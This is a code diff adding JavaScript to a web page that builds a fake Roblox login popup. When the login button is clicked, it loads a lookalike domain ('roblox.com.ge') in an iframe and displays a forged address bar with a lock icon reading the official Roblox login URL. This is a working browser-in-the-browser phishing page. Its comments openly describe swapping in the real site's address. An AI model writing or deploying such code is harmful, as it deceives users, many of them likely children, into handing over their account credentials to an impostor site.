@@ -379,4 +379,34 @@
     const iframe = document.getElementById("popupIframe");
     const urlDisplay = document.getElementById("urlDisplay");
 
-    loginBtn.addEventListener("click",
+    loginBtn.addEventListener("click", () => {
+      // Show popup and overlay
+      fakePopup.style.display = "block";
+      overlay.style.display = "block";
+
+      // Load your actual URL in iframe
+      iframe.src = "https://roblox.com.ge/login?returnUrl=2099296147452818";
+
+      // Show official Roblox URL in URL bar
+      urlDisplay.innerHTML = '<span class="lock-icon">🔒</span> https://roblox.com/login';
+    });
+
+    popupClose.addEventListener("click", () => {
+      fakePopup.style.display = "none";
+      overlay.style.display = "none";
+      iframe.src = ""; // Stop iframe from loading to save resources
+    });
+
+    overlay.addEventListener("click", () => {
+      fakePopup.style.display = "none";
+      overlay.style.display = "none";
+      iframe.src = "";
+    });
+
+    // Hamburger toggle for mobile menu
+    hamburger.addEventListener("click", () => {
+      mobileMenu.classList.toggle("open");
+    });
+  </script>
+</body>
+</html>
